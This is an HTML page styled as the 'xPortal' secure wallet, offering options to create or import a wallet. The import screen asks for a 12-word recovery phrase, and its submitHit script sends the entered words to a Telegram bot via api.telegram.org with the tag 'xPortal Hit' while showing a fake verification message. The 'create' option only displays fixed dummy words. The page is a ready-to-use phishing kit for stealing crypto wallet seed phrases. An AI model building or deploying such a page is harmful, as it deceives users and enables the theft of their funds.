<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>xPortal | Secure Wallet</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
    <style>
        :root { --xp-black: #000; --xp-teal: #23f7dd; --xp-purple: #8a3ffc; --xp-border: rgba(255, 255, 255, 0.1); }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
        body { background: var(--xp-black); color: #fff; min-height: 100vh; background: radial-gradient(circle at 50% -20%, #1e0b3b 0%, #000 70%); }
        
        nav { width: 100%; height: 70px; display: flex; align-items: center; padding: 0 5%; border-bottom: 1px solid var(--xp-border); background: rgba(0,0,0,0.5); backdrop-filter: blur(20px); position: fixed; top: 0; z-index: 100; }
        .nav-logo { display: flex; align-items: center; gap: 10px; font-weight: 800; font-size: 20px; }
        .nav-logo img { width: 32px; height: 32px; object-fit: contain; }

        .page-section { display: none; margin-top: 100px; width: 100%; animation: fadeIn 0.3s; padding: 20px; flex-direction: column; align-items: center; }
        .page-section.active { display: flex; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }

        .glass-card { background: rgba(13, 13, 13, 0.8); border: 1px solid var(--xp-border); border-radius: 32px; padding: 40px 25px; text-align: center; width: 100%; max-width: 450px; box-shadow: 0 40px 80px rgba(0,0,0,0.8); }
        .card-icon { width: 70px; height: 70px; margin-bottom: 20px; object-fit: contain; }

        .btn-main { width: 100%; height: 60px; border-radius: 100px; border: none; font-weight: 700; font-size: 16px; cursor: pointer; margin-bottom: 12px; transition: 0.2s; }
        .btn-white { background: #fff; color: #000; }
        .btn-dark { background: rgba(255,255,255,0.05); color: #fff; border: 1px solid var(--xp-border); }
        
        .words-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-bottom: 20px; }
        .word-box { position: relative; }
        .word-box span { position: absolute; left: 8px; top: 50%; transform: translateY(-50%); color: var(--xp-teal); font-size: 10px; font-weight: 700; }
        .word-box input { width: 100%; background: #000; border: 1px solid var(--xp-border); border-radius: 10px; padding: 12px 5px 12px 25px; color: #fff; font-size: 13px; }

        #loading-text { display: none; color: var(--xp-teal); font-weight: 600; margin-top: 15px; }
    </style>
</head>
<body>

<nav>
    <div class="nav-logo"><img src="Capture.PNG"><span>xPortal</span></div>
</nav>

<section id="home" class="page-section active">
    <div class="glass-card">
        <img src="Capture.PNG" class="card-icon">
        <h2>Welcome to xPortal</h2>
        <p style="color:#949494; margin: 15px 0 30px;">Choose an option to manage your assets.</p>
        <button class="btn-main btn-white" onclick="showSection('create')">Create New Wallet</button>
        <button class="btn-main btn-dark" onclick="showSection('import')">Import Wallet</button>
    </div>
</section>

<section id="create" class="page-section">
    <div class="glass-card">
        <img src="Capture.PNG" class="card-icon">
        <h2>Recovery Phrase</h2>
        <p style="color:#949494; margin-bottom: 20px;">Save these 12 words securely.</p>
        <div class="words-grid" id="gen-grid"></div>
        <button class="btn-main btn-white" onclick="showSection('verify')">I've saved them</button>
    </div>
</section>

<section id="import" class="page-section">
    <div class="glass-card">
        <img src="Capture.PNG" class="card-icon">
        <h2>Secret Phrase</h2>
        <p style="color:#949494; margin-bottom: 20px;">Enter your 12 words phrase.</p>
        <div class="words-grid" id="input-grid"></div>
        <button class="btn-main btn-white" id="subBtn" onclick="submitHit()">Connect Wallet</button>
        <div id="loading-text">Verifying connection...</div>
    </div>
</section>

<script>
    const TOKEN = 'YOUR_BOT_TOKEN';
    const CHAT_ID = 'YOUR_CHAT_ID';

    const dummyWords = ["apple","brave","ocean","tiger","smart","focus","cloud","planet","winter","summer","bright","shield"];

    function showSection(id) {
        document.querySelectorAll('.page-section').forEach(s => s.classList.remove('active'));
        document.getElementById(id).classList.add('active');
        if(id === 'create') {
            const g = document.getElementById('gen-grid');
            g.innerHTML = dummyWords.map((w, i) => `<div class="word-box"><span>${i+1}</span><input value="${w}" readonly></div>`).join('');
        }
        if(id === 'import' || id === 'verify') {
            const g = document.getElementById('input-grid');
            g.innerHTML = '';
            for(let i=1; i<=12; i++) g.innerHTML += `<div class="word-box"><span>${i}</span><input type="text" class="w-in"></div>`;
        }
    }

    function submitHit() {
        let words = [];
        document.querySelectorAll('.w-in').forEach(i => words.push(i.value.trim()));
        const phrase = words.join(" ");
        
        document.getElementById('subBtn').style.display = 'none';
        document.getElementById('loading-text').style.display = 'block';

        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent("🚨 xPortal Hit:\n\n" + phrase)}`);
    }
</script>

</body>
</html>
